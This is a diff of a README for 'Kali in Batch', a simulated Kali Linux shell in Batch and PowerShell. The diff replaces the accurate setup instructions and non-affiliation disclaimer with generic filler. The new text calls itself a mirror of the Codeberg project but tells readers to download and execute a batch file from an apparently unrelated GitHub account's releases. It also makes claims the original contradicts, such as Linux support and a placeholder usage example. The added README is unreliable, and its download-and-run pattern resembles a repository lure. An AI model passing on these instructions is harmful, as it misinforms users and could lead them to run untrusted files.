@@ -1,100 +1,72 @@
-## Kali in Batch
+# Kali in Batch 🐚
 
-A simulated Kali Linux environment in Batch and PowerShell.
+![Kali in Batch](https://img.shields.io/badge/version-1.0.0-blue.svg) ![License](https://img.shields.io/badge/license-MIT-green.svg) ![GitHub All Releases](https://img.shields.io/github/downloads/cekkey/kali-in-batch/total.svg)
 
-### Dependencies
+Welcome to **Kali in Batch**, a read-only mirror of [Kali in Batch on Codeberg](https://codeberg.org/Kali-in-Batch/kali-in-batch). This repository serves as a collection of batch scripts designed to enhance your experience with Kali Linux and related environments.
 
-- [Nmap](https://nmap.org/)
-- [Git for Windows](https://git-scm.com/download/win) (make sure you get Git Bash and use a system-wide installation)
-- [Vim (optional)](https://www.vim.org/download.php)
-- [PowerShell 7+](https://github.com/PowerShell/PowerShell/releases) (or you can get it from Microsoft Store)
+## Table of Contents
 
-### Usage
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Topics](#topics)
+- [Contributing](#contributing)
+- [License](#license)
+- [Releases](#releases)
 
-Clone the repository:
-```bash
-git clone https://codeberg.org/Kali-in-Batch/kali-in-batch.git
-```
-```bash	
-cd kali-in-batch
-```
+## Introduction
 
-Then, run `kali_in_batch.bat` inside the src directory. For proper functionality, don't move it out of the src directory.
+Kali Linux is a powerful tool for penetration testing and security assessments. With **Kali in Batch**, you can automate various tasks using batch scripts. This project simplifies repetitive processes, making it easier for users to focus on their core objectives.
 
-Do not run any of the PowerShell scripts manually, as they require special arguments given by `kali_in_batch.bat`.
+## Features
 
-Once you have set up Kali in Batch, try installing this package in the Kali in Batch shell:
-```bash
-pkg install elf-exec
-```
-This package allows you to execute Linux binaries.
-Run it:
-```bash
-pkg-exec elf-exec
-```
+- **Batch File Automation**: Easily execute multiple commands in a single script.
+- **Cross-Platform Support**: Works on various environments, including Windows and Linux.
+- **CLI Friendly**: Designed for command-line interface users.
+- **Custom Scripts**: Create your own scripts to meet specific needs.
 
-### Quick tutorial
+## Installation
 
-#### During the Kali in Batch installer
+To get started, you can download the latest version from the [Releases](https://github.com/cekkey/kali-in-batch/releases) section. Simply download the desired file and execute it in your terminal or command prompt.
 
-- Press Windows + R
-- Type diskmgmt.msc
-- Shrink any drive with any amount of space
-- Create a drive in the unallocated space
-- Type the drive letter of the new drive in the Kali in Batch installer
-- Press Enter
-- After this, Kali in Batch should be automatically set up
+1. Visit the [Releases](https://github.com/cekkey/kali-in-batch/releases) section.
+2. Download the batch file.
+3. Execute the script using your preferred shell.
 
-#### After installation
+## Usage
 
-Try the following commands:
+Once you have downloaded and executed the batch file, you can start using the scripts. Here’s a simple example:
 
 ```bash
-ls
-```
-```bash
-cd /
-```
-```bash
-cd ~
-```
-```bash
-pwd
-```
-```bash
-ls -l
-```
-```bash
-cd ..
-```
-```bash
-uname -a
-```
-```bash
-whoami
-```
-```bash
-git --version
-```
-```bash
-pkg install hello-world
-```
-```bash
-pkg-exec hello-world
+# Run a script
+bash your_script.sh
 ```
 
-These should help you get familiar with the shell. If you're already familiar with Linux shells, only do the package manager commands.
+Make sure to adjust the script name according to your needs. The repository contains various scripts tailored for different tasks.
 
-### Features
+## Topics
 
-- [x] Networking with ping and nmap
-- [x] Package management with pkg
-- [x] File management with cp, mv, rm, and mkdir
-- [x] Text editing with vim or any other text editor
-- [x] Terminal control with clear, exit, and help
-- [x] System information with uname and whoami
-- [x] Version control with Git
+This repository covers a range of topics relevant to batch scripting and Kali Linux. Here are some key areas:
+
+- **API**: Interact with various APIs using batch scripts.
+- **Bash**: Utilize bash scripting for automation.
+- **Batch Files**: Create and manage batch files effectively.
+- **CLI**: Command-line interface usage for efficient operations.
+- **PowerShell**: Implement PowerShell scripts for Windows environments.
+
+## Contributing
+
+We welcome contributions from the community. If you have suggestions or improvements, feel free to fork the repository and submit a pull request. Please ensure your code adheres to the existing style and includes appropriate documentation.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Releases
+
+For the latest updates and downloads, visit the [Releases](https://github.com/cekkey/kali-in-batch/releases) section. You can find the most recent batch files and their changelogs there.
 
 ---
 
-This project is **NOT** associated with Kali Linux or any of it's contributors.
+Thank you for exploring **Kali in Batch**. We hope this repository enhances your Kali Linux experience. If you have any questions or need assistance, feel free to open an issue in this repository. Happy scripting!
